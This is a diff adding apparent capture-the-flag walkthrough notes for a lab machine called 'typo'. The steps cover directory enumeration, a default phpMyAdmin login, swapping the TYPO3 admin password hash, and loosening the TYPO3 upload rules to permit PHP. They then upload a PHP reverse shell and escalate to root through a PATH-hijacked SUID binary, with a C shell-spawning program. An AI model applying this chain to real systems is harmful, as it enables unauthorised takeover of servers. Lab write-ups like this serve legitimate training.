@@ -1,0 +1,77 @@
+typo
+
+dirb http://192.168.1.3:8081
+
+here we got phpmyadmin
+
+here default crendials worked
+
+login with crendiantials
+root
+root
+
+replace hash with our hash
+here hash is argon2
+
+go to make argon2 hash and replace with admin hash
+
+https://antelle.net/argon2-browser/
+
+login to 
+http://192.168.1.3/typo3
+
+admin
+hash generated password
+
+go to setting and search for [BE][fileDenyPattern] = $TYPO3_CONF_VARS['BE']['f… 
+
+edit code
+$TYPO3_CONF_VARS['BE']['fileExtensions']['webspace']['allow'] = 'php'; $TYPO3_CONF_VARS['BE']['fileExtensions']['webspace']['deny'] = ''; $TYPO3_CONF_VARS['BE']['fileDenyPattern'] = '';
+
+this will allow us to upload the php file
+
+then go to file upload or user upload
+
+upload php file and take rverse shell
+
+su root
+rootroot1
+
+intended way is 
+suid binary
+which is on apache2-restart
+
+strings apache2-restart
+
+cd \tmp
+vim nitesh.c and write the code
+g
+#include<stdio.h>
+#include<unistd.h>
+#include<sys/types.h>
+int main()
+{
+	setuid(geteuid());
+	system("/bin/bash");
+	return 0;
+}
+
+gcc nitesh.c -o service
+chmod u+s service
+
+now set path to /tmp folder
+
+echo $PATH
+export PATH=/tmp:$PATH
+
+apache2-restart
+
+and yes we got root shell
+
+
+
+
+
+
+
+
